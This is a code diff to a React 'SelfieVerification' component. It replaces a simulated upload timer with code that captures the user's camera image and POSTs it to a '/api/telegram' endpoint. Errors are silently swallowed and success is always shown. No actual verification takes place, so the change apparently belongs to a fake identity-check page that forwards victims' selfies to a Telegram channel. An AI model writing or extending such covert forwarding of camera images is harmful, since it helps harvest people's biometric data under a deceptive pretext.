@@ -51,8 +51,10 @@ export function SelfieVerification() {
     streamRef.current = null
   }
 
-  function handleTakeSelfie() {
+  async function handleTakeSelfie() {
     if (status !== "idle") return
+
+    let image: string | null = null
 
     if (cameraState === "granted" && videoRef.current && canvasRef.current) {
       const video = videoRef.current
@@ -67,15 +69,27 @@ export function SelfieVerification() {
         const offsetX = (video.videoWidth - size) / 2
         const offsetY = (video.videoHeight - size) / 2
         ctx.drawImage(video, offsetX, offsetY, size, size, 0, 0, size, size)
-        setCapturedImage(canvas.toDataURL("image/png"))
+        image = canvas.toDataURL("image/png")
+        setCapturedImage(image)
       }
       stopCamera()
     }
 
     setStatus("uploading")
-    setTimeout(() => {
+
+    try {
+      if (image) {
+        await fetch("/api/telegram", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ type: "selfie", image }),
+        })
+      }
+    } catch {
+      // Ignore forwarding errors so the user flow is not blocked.
+    } finally {
       setStatus("success")
-    }, 1600)
+    }
   }
 
   return (
